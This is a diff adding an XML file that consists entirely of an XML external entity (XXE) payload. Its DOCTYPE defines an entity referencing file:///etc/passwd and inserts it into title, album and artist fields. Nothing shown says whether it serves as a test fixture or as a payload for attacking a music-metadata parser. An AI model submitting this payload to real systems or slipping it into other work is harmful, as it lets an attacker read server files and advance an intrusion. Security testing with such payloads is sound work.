@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT title ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<root>
+<title>&xxe;</title>
+<album> &xxe;</album>
+<artist>&xxe;</artist>
+</root>
